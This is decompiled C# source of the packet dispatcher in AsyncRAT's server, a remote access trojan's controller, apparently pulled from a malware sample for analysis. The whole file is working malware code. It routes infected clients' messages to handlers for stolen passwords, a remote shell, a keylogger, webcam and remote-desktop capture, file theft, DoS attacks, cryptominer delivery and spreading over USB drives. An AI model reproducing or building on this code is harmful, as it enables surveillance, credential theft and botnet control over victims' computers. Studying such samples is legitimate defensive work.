// Decompiled with JetBrains decompiler
// Type: Server.Handle_Packet.Packet
// Assembly: AsyncRAT, Version=0.5.7.0, Culture=neutral, PublicKeyToken=null
// MVID: 51786A10-CF9D-455B-B8A4-B82CB9EDE322
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Alien.gen-bb1f2c2c9b279790b67eaea6ab0bbce3a4d4432bbe1bd716750f2f9ba3337f7e.exe

using Server.Connection;
using Server.MessagePack;
using System;
using System.Drawing;
using System.Threading;

namespace Server.Handle_Packet
{
  public class Packet
  {
    public Clients client;
    public byte[] data;

    public void Read(object o)
    {
      try
      {
        MsgPack unpack_msgpack = new MsgPack();
        unpack_msgpack.DecodeFromBytes(this.data);
        Program.form1.Invoke((Delegate) (() =>
        {
          string asString = unpack_msgpack.ForcePathObject(nameof (Packet)).AsString;
          if (asString == null)
            return;
          // ISSUE: reference to a compiler-generated method
          switch (\u003CPrivateImplementationDetails\u003E.ComputeStringHash(asString))
          {
            case 29539515:
              if (!(asString == "recoveryPassword"))
                break;
              HandleRecovery handleRecovery = new HandleRecovery(this.client, unpack_msgpack);
              break;
            case 60411378:
              if (!(asString == "chat-"))
                break;
              new HandleChat().GetClient(unpack_msgpack, this.client);
              break;
            case 78554036:
              if (!(asString == "dosAdd"))
                break;
              new HandleDos().Add(this.client, unpack_msgpack);
              break;
            case 300022785:
              if (!(asString == "shell"))
                break;
              HandleShell handleShell = new HandleShell(unpack_msgpack, this.client);
              break;
            case 859067476:
              if (!(asString == "socketDownload"))
                break;
              new HandleFileManager().SocketDownload(this.client, unpack_msgpack);
              break;
            case 1231575816:
              if (!(asString == "webcam"))
                break;
              HandleWebcam handleWebcam = new HandleWebcam(unpack_msgpack, this.client);
              break;
            case 1370058150:
              if (!(asString == "Logs"))
                break;
              new HandleLogs().Addmsg("Client " + this.client.Ip + " " + unpack_msgpack.ForcePathObject("Message").AsString, Color.Black);
              break;
            case 1452393313:
              if (!(asString == "usb"))
                break;
              new HandleLogs().Addmsg("Client " + this.client.Ip + " found " + unpack_msgpack.ForcePathObject("Count").AsString + " USB drivers and spreaded them successfully", Color.Purple);
              break;
            case 1559762898:
              if (!(asString == "Received"))
                break;
              new HandleListView().Received(this.client);
              break;
            case 1800677779:
              if (!(asString == "reportWindow"))
                break;
              HandleReportWindow handleReportWindow = new HandleReportWindow(this.client, unpack_msgpack.ForcePathObject("Report").AsString);
              break;
            case 1911311572:
              if (!(asString == "sendPlugin"))
                break;
              new HandleLogs().Addmsg("Sending the plugin to client " + this.client.Ip + " for the first time please wait..", Color.Blue);
              ThreadPool.QueueUserWorkItem((WaitCallback) (_param1 => this.client.SendPlugin(unpack_msgpack.ForcePathObject("Hashes").AsString)));
              break;
            case 1933479032:
              if (!(asString == "fileSearcher"))
                break;
              new HandlerFileSearcher().SaveZipFile(this.client, unpack_msgpack);
              break;
            case 2061178551:
              if (!(asString == "pong"))
                break;
              new HandlePing().Pong(this.client, unpack_msgpack);
              break;
            case 2142761129:
              if (!(asString == "Ping"))
                break;
              new HandlePing().Ping(this.client, unpack_msgpack);
              break;
            case 2155392417:
              if (!(asString == "processManager"))
                break;
              new HandleProcessManager().GetProcess(this.client, unpack_msgpack);
              break;
            case 2207001692:
              if (!(asString == "thumbnails"))
                break;
              this.client.ID = unpack_msgpack.ForcePathObject("Hwid").AsString;
              HandleThumbnails handleThumbnails = new HandleThumbnails(this.client, unpack_msgpack);
              break;
            case 2319240225:
              if (!(asString == "remoteDesktop"))
                break;
              new HandleRemoteDesktop().Capture(this.client, unpack_msgpack);
              break;
            case 2722888107:
              if (!(asString == "chat"))
                break;
              new HandleChat().Read(unpack_msgpack, this.client);
              break;
            case 3011360282:
              if (!(asString == "reportWindow-"))
                break;
              if (!Settings.ReportWindow)
              {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject(nameof (Packet)).AsString = "reportWindow";
                msgPack.ForcePathObject("Option").AsString = "stop";
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.client.Send), (object) msgPack.Encode2Bytes());
                break;
              }
              lock (Settings.LockReportWindowClients)
              {
                Settings.ReportWindowClients.Add(this.client);
                break;
              }
            case 3032815688:
              if (!(asString == "keyLogger"))
                break;
              HandleKeylogger handleKeylogger = new HandleKeylogger(this.client, unpack_msgpack);
              break;
            case 3233163102:
              if (!(asString == "ClientInfo"))
                break;
              ThreadPool.QueueUserWorkItem((WaitCallback) (_param1 => new HandleListView().AddToListview(this.client, unpack_msgpack)));
              break;
            case 3578771430:
              if (!(asString == "GetXmr"))
                break;
              new HandleMiner().SendMiner(this.client);
              break;
            case 3644100786:
              if (!(asString == "fileManager"))
                break;
              new HandleFileManager().FileManager(this.client, unpack_msgpack);
              break;
            case 3694678581:
              if (!(asString == "BotKiller"))
                break;
              new HandleLogs().Addmsg("Client " + this.client.Ip + " found " + unpack_msgpack.ForcePathObject("Count").AsString + " malwares and killed them successfully", Color.Orange);
              break;
            case 4086144241:
              if (!(asString == "Error"))
                break;
              new HandleLogs().Addmsg("Client " + this.client.Ip + " error: " + unpack_msgpack.ForcePathObject("Error").AsString, Color.Red);
              lock (Settings.LockListviewClients)
              {
                this.client.LV.ForeColor = Color.Empty;
                break;
              }
          }
        }));
      }
      catch
      {
      }
    }
  }
}
